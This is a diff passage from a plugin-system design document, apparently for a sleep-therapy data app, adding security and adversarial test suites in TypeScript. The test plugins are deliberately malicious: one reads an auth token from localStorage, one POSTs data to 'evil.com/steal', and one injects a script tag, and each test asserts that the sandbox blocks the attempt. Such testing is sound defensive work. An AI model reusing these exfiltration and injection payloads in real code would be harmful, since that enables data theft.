+    message: `${preferredPlugin.name} failed. Using ${fallbackPlugin.name} instead.`
+  });
+  
+  // Try fallback plugin
+  const fallbackResult = await executePluginWithRetry(fallbackPlugin, input);
+  
+  if (fallbackResult.ok) {
+    return fallbackResult.value;
+  }
+  
+  // Both failed, throw error
+  throw new Error(
+    `Both plugins failed:\n` +
+    `- ${preferredPlugin.name}: ${preferredResult.error.message}\n` +
+    `- ${fallbackPlugin.name}: ${fallbackResult.error.message}`
+  );
+}
+```
+
+### 8.12 Testing Plugin Security
+
+**Objective**: Verify plugin isolation, permission enforcement, and resource limits through automated security tests.
+
+#### 8.12.1 Security Test Suite
+
+```typescript
+/**
+ * Security test suite for plugin system
+ */
+describe('Plugin Security', () => {
+  describe('Isolation', () => {
+    it('should prevent plugin from accessing DOM', async () => {
+      const maliciousPlugin = createTestPlugin({
+        id: 'malicious-dom-access',
+        code: `
+          // Attempt to access DOM
+          self.onmessage = () => {
+            try {
+              const elem = document.getElementById('app');
+              self.postMessage({ success: true, elem });
+            } catch (error) {
+              self.postMessage({ success: false, error: error.message });
+            }
+          };
+        `
+      });
+      
+      const result = await executePlugin(maliciousPlugin, {});
+      
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('document is not defined');
+    });
+    
+    it('should prevent plugin from accessing localStorage', async () => {
+      const maliciousPlugin = createTestPlugin({
+        code: `
+          self.onmessage = () => {
+            try {
+              const token = localStorage.getItem('auth-token');
+              self.postMessage({ success: true, token });
+            } catch (error) {
+              self.postMessage({ success: false, error: error.message });
+            }
+          };
+        `
+      });
+      
+      const result = await executePlugin(maliciousPlugin, {});
+      
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('localStorage is not defined');
+    });
+    
+    it('should prevent plugin from accessing other plugin data', async () => {
+      // Plugin A stores data
+      const pluginA = createTestPlugin({ id: 'plugin-a' });
+      await executePlugin(pluginA, { action: 'store', data: 'secret' });
+      
+      // Plugin B attempts to read Plugin A's data
+      const pluginB = createTestPlugin({
+        id: 'plugin-b',
+        code: `
+          self.onmessage = () => {
+            try {
+              const otherData = self.pluginRegistry.get('plugin-a').data;
+              self.postMessage({ success: true, otherData });
+            } catch (error) {
+              self.postMessage({ success: false, error: error.message });
+            }
+          };
+        `
+      });
+      
+      const result = await executePlugin(pluginB, {});
+      
+      expect(result.success).toBe(false);
+      expect(result.error).toContain('pluginRegistry is not defined');
+    });
+  });
+  
+  describe('Permission Enforcement', () => {
+    it('should deny network access without permission', async () => {
+      const plugin = createTestPlugin({
+        id: 'no-network-perm',
+        permissions: ['storage.read'], // No 'network' permission
+        code: `
+          self.onmessage = async () => {
+            try {
+              await fetch('https://example.com/data');
+              self.postMessage({ success: true });
+            } catch (error) {
+              self.postMessage({ success: false, error: error.message });
+            }
+          };
+        `
+      });
+      
+      await expect(executePlugin(plugin, {})).rejects.toThrow(SecurityError);
+      await expect(executePlugin(plugin, {})).rejects.toThrow('PERMISSION_DENIED');
+    });
+    
+    it('should deny signal access without permission', async () => {
+      const plugin = createTestPlugin({
+        permissions: ['storage.read', 'data.sessions'], // No 'data.signals'
+      });
+      
+      const dataProvider = createSecureDataProvider(plugin);
+      
+      await expect(
+        dataProvider.getSignalData('session-123', 'Flow')
+      ).rejects.toThrow('data.signals');
+    });
+    
+    it('should deny undeclared signal channels', async () => {
+      const plugin = createTestPlugin({
+        permissions: ['storage.read', 'data.signals'],
+        dataRequirements: {
+          signals: ['Flow'] // Only Flow declared
+        }
+      });
+      
+      const dataProvider = createSecureDataProvider(plugin);
+      
+      // Allowed: declared signal
+      await expect(
+        dataProvider.getSignalData('session-123', 'Flow')
+      ).resolves.toBeDefined();
+      
+      // Denied: undeclared signal
+      await expect(
+        dataProvider.getSignalData('session-123', 'Pressure')
+      ).rejects.toThrow('UNDECLARED_DATA_ACCESS');
+    });
+  });
+  
+  describe('Resource Limits', () => {
+    it('should terminate plugin after timeout', async () => {
+      const plugin = createTestPlugin({
+        timeoutMs: 1000, // 1 second timeout
+        code: `
+          self.onmessage = () => {
+            // Infinite loop
+            while (true) {}
+          };
+        `
+      });
+      
+      const start = Date.now();
+      await expect(executePlugin(plugin, {})).rejects.toThrow(TimeoutError);
+      const duration = Date.now() - start;
+      
+      // Should terminate close to timeout (within 200ms tolerance)
+      expect(duration).toBeGreaterThanOrEqual(1000);
+      expect(duration).toBeLessThan(1200);
+    });
+    
+    it('should enforce memory limits', async () => {
+      const plugin = createTestPlugin({
+        maxMemoryMB: 100,
+        code: `
+          self.onmessage = () => {
+            // Allocate large array (>100MB)
+            const data = new Float32Array(30_000_000); // 120MB
+            self.postMessage({ success: true, size: data.length });
+          };
+        `
+      });
+      
+      // Note: Memory limits are best-effort and browser-dependent
+      // This test may not fail in all environments
+      await expect(executePlugin(plugin, {})).rejects.toThrow(/memory|limit/i);
+    });
+  });
+  
+  describe('Error Isolation', () => {
+    it('should not crash app when plugin crashes', async () => {
+      const crashingPlugin = createTestPlugin({
+        code: `
+          self.onmessage = () => {
+            throw new Error('Plugin crash!');
+          };
+        `
+      });
+      
+      const result = await executePluginIsolated(crashingPlugin, {});
+      
+      // Result should be an error, not a thrown exception
+      expect(result.ok).toBe(false);
+      expect(result.error.category).toBe(ErrorCategory.WORKER);
+      
+      // App should still be functional (can execute another plugin)
+      const workingPlugin = createTestPlugin({
+        code: `
+          self.onmessage = () => {
+            self.postMessage({ success: true });
+          };
+        `
+      });
+      
+      const result2 = await executePluginIsolated(workingPlugin, {});
+      expect(result2.ok).toBe(true);
+    });
+  });
+  
+  describe('Code Integrity', () => {
+    it('should reject plugin with invalid integrity hash', async () => {
+      const code = 'self.onmessage = () => self.postMessage({ success: true });';
+      const validHash = await generatePluginIntegrityHash(code);
+      const invalidHash = 'invalid' + validHash.slice(7);
+      
+      const manifest: PluginManifest = {
+        id: 'test-plugin',
+        name: 'Test Plugin',
+        version: '1.0.0',
+        author: 'Test',
+        description: 'Test description that is long enough',
+        type: 'analysis',
+        permissions: [],
+        integrityHash: invalidHash,
+        main: 'https://example.com/plugin.js'
+      };
+      
+      const integrityCheck = await verifyPluginIntegrity(manifest);
+      expect(integrityCheck.valid).toBe(false);
+      expect(integrityCheck.error).toContain('hash mismatch');
+    });
+    
+    it('should reject plugin with eval()', async () => {
+      const code = `
+        self.onmessage = (e) => {
+          const result = eval(e.data.expression);
+          self.postMessage({ result });
+        };
+      `;
+      
+      const validation = validateNoEval(code);
+      expect(validation.valid).toBe(false);
+      expect(validation.violations).toContain('Uses eval() (prohibited)');
+    });
+    
+    it('should reject plugin with Function() constructor', async () => {
+      const code = `
+        self.onmessage = (e) => {
+          const fn = new Function('x', 'return x * 2');
+          self.postMessage({ result: fn(21) });
+        };
+      `;
+      
+      const validation = validateNoEval(code);
+      expect(validation.valid).toBe(false);
+      expect(validation.violations).toContain('Uses Function() constructor (prohibited)');
+    });
+  });
+});
+```
+
+#### 8.12.2 Adversarial Plugin Testing
+
+```typescript
+/**
+ * Adversarial test suite: malicious plugins attempting to bypass security
+ */
+describe('Adversarial Plugin Tests', () => {
+  it('should prevent data exfiltration via network request', async () => {
+    const exfiltratingPlugin = createTestPlugin({
+      permissions: [' storage.read', 'data.signals'], // No 'network'
+      code: `
+        self.onmessage = async (e) => {
+          const sensitiveData = e.data;
+          
+          // Attempt to exfiltrate via fetch
+          try {
+            await fetch('https://evil.com/steal', {
+              method: 'POST',
+              body: JSON.stringify(sensitiveData)
+            });
+            self.postMessage({ exfiltrated: true });
+          } catch (error) {
+            self.postMessage({ exfiltrated: false, error: error.message });
+          }
+        };
+      `
+    });
+    
+    await expect(
+      executePlugin(exfiltratingPlugin, { ahi: 5.2, session: 'abc-123' })
+    ).rejects.toThrow('PERMISSION_DENIED');
+  });
+  
+  it('should prevent XSS injection via plugin UI', async () => {
+    const xssPlugin: VisualizationPlugin = {
+      manifest: createTestManifest({ id: 'xss-plugin' }),
+      ComponentType: () => {
+        // Attempt to inject script tag
+        return React.createElement('div', {
+          dangerouslySetInnerHTML: {
+            __html: '<script>alert("XSS")</script>'
+          }
+        });
+      }
+    };
+    
+    // Render plugin in error boundary
+    const { container } = render(
+      <PluginUIErrorBoundary plugin={xssPlugin.manifest}>
+        <xssPlugin.ComponentType data={{}} />
+      </PluginUIErrorBoundary>
+    );
+    
+    // CSP should block inline script execution
+    // Even if rendered, script won't execute due to CSP
+    expect(container.querySelector('script')).toBeNull();
+  });
+  
+  it('should prevent storage corruption via invalid result', async () => {
+    const corruptingPlugin = createTestPlugin({
+      permissions: ['storage.read', 'storage.write', 'data.aggregates'],
+      code: `
+        self.onmessage = async (e) => {
+          const api = e.data.api;
+          
+          // Attempt to write corrupted data
+          await api.saveResult({
+            pluginId: 'corrupting-plugin',
+            data: {
+              ahi: -999999, // Invalid: negative AHI
+              pressure: 'foo', // Invalid: non-number
+            }
+          });
+          
+          self.postMessage({ success: true });
+        };
+      `
+    });
+    
+    await expect(executePlugin(corruptingPlugin, {})).rejects.toThrow(ValidationError);
+    await expect(executePlugin(corruptingPlugin, {})).rejects.toThrow('Invalid AHI value');
+  });
+});
+```
+
+#### 8.12.3 Resource Limit Enforcement Tests
+
+```typescript
+/**
+ * Test resource limits are enforced
+ */
+describe('Resource Limit Enforcement', () => {
+  it('should kill plugin consuming excessive CPU time', async () => {
+    const cpuHogPlugin = createTestPlugin({
+      timeoutMs: 2000,
+      code: `
+        self.onmessage = () => {
+          // CPU-intensive loop
+          const start = Date.now();
+          let sum = 0;
+          while (Date.now() - start < 10000) { // Try to run for 10 seconds
+            sum += Math.sqrt(Math.random());
+          }
+          self.postMessage({ success: true, sum });
+        };
+      `
+    });
+    
+    await expect(executePlugin(cpuHogPlugin, {})).rejects.toThrow(TimeoutError);
+  });
+  
+  it('should prevent plugin from exhausting storage quota', async () => {
+    const storageHogPlugin = createTestPlugin({
+      permissions: ['storage.write'],
+    });
+    
+    const dataProvider = createSecureDataProvider(storageHogPlugin);
+    
+    // Attempt to save huge result (100MB)
+    const hugeResult: AnalysisResult = {
+      pluginId: storageHogPlugin.manifest.id,
+      data: {
+        // Generate 100MB of data
+        hugeArray: new Array(10_000_000).fill('x'.repeat(10))
+      }
+    };
+    
+    await expect(
+      dataProvider.saveResult(hugeResult)
+    ).rejects.toThrow(/too large|limit/i);
+  });
+});
+```
+
+---
 
 ---
 
